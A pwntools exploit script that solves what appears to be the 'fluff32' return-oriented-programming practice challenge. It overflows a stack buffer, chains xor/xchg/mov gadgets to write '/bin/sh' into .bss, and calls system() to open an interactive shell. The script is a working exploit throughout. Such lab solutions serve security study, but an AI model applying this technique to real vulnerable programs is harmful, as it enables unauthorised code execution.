from pwn import *

sh = process('./fluff32')
elf = ELF('./fluff32')

pop_ebx_addr = 0x080483e1
xor_edx_edx_addr = 0x08048671
xor_edx_ebx_addr = 0x0804867b
xchg_addr = 0x08048689
mov_addr = 0x08048693

bss_addr = 0x0804a040
sys_addr = elf.symbols['system']

def mov_data(string, addr):
	payload = p32(pop_ebx_addr) + p32(addr)
	payload += p32(xor_edx_edx_addr) + p32(0xdeadbeef)
	payload += p32(xor_edx_ebx_addr) + p32(0xdeadbeef)
	payload += p32(xchg_addr) + p32(0xdeadbeef)
	payload += p32(pop_ebx_addr) + string
	payload += p32(xor_edx_edx_addr) + p32(0xdeadbeef)
	payload += p32(xor_edx_ebx_addr) + p32(0xdeadbeef)
	payload += p32(mov_addr) + p32(0xdeadbeef) + p32(0)
	return payload

payload = 'a' * (0x28 + 0x4)
payload += mov_data('/bin', bss_addr)
payload += mov_data('/sh\x00', bss_addr + 4)
payload += p32(sys_addr) + p32(0xdeadbeef) + p32(bss_addr)

sh.recvuntil('>')
sh.sendline(payload)

sh.interactive()
sh.close()